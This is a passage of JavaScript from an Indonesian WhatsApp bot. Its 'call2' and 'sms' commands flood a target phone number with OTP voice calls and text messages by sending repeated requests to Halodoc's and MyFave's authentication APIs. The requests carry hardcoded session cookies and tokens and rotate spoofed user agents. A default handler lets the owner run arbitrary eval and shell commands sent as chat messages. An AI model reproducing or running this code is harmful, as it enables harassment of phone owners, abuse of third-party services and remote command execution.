'?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {paycall(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {paycall(`${JSON.stringify(error, null, 2)}`)})
}
break
case "call2":
if (!isCreator) return reply('Khusus Owner')
let shinchan = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
let shinko = text.split("|")[1]
for (let i = 1; i < shinko ; i++){
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${shinchan}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}})
.then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Succes Spam (CALL) BY SHINCHAN SENPAI INC`);
})
.catch(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Failed Spam (CALL) BY SHINCHAN SENPAI INC`);
});
}
reply(`[ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙎𝙚𝙣𝙙 𝘾𝙖𝙡𝙡 ]\n\n﹗𝐂𝐚𝐥𝐥 : ${shinchan}\n﹗𝐀𝐦𝐨𝐮𝐧𝐭 : ${shinko}\n﹗𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}\n﹗𝐓𝐚𝐧𝐠𝐠𝐚𝐥 : ${week} ${weton}, ${date}\n﹗𝐉𝐚𝐦 : ${time}\n﹗𝐎𝐰𝐧𝐞𝐫 : ẉa.me/6282134110253`)
break
//=================================================
case 'sms': {
if (!isCreator) return m.reply('*khusus Premium*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) SHINCHAN SENPAI`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
//=================================================//

default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('< ')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
               try {
                  return reply(JSON.stringify(eval(`${args.join(' ')}`), null, '\t'))
               } catch (e) {
                  reply(util.format(e))
               }
            }
if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(`*khusus Owner*`)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }

if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
